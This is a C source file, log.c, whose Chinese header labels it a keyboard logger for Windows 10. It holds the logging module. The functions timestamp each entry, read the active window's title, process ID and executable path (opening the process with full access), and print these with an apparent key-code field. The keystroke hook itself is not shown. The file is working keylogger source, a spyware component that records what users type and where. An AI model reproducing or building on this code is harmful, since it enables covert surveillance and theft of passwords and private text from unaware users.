/*
*  文件名：log.c
*  用途：键盘记录
*  编程环境：Win10
*  完成日期： 2016.6   Ver 0.01
*  作者： yinhao
*  联系方式： E-mail: yinhao746746@163.com
*/

#include "log.h"

//获取当前时间，格式化输出，例如2016/06/11-15:01:20
int logGetTime(char *ptime){
	time_t rawtime;
	struct tm * timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	sprintf(ptime,"%04d/%02d/%02d-%02d:%02d:%02d",timeinfo->tm_year+1900,timeinfo->tm_mon+1,timeinfo->tm_mday,timeinfo->tm_hour,timeinfo->tm_min,timeinfo->tm_sec);
	return strlen(ptime);
}

//记录当前的所有状态
int logGetInfo(PLOG_STRU plog){
	HANDLE handle;
	HWND hWnd = GetForegroundWindow();	//获取当前系统中被激活的前台窗口句柄
	if (hWnd != INVALID_HANDLE_VALUE){
		logGetTime(plog->time);			//格式化当前时间
		GetWindowText(hWnd, plog->text, TEXT_LEN);		//获取激活窗口的标题text
		GetWindowThreadProcessId(hWnd,&plog->pid);		//获取激活窗口的进程ID
		handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, plog->pid);		//通过进程ID查找对应的句柄handle
		GetModuleFileNameEx(handle,NULL,plog->path,PATH_LEN);		//用句柄获取当前程序的执行路径
		return 1;
	}
	return 0;
}

//打印格式化信息作为日志输出
void logPrintInfo(LOG_STRU log){
	char str[MAX_LOG];
	sprintf(str,"%s,%ld,%s,%s,%s",log.time,log.pid,log.path,log.text,log.sCode);
	printf("%s\n",str);
}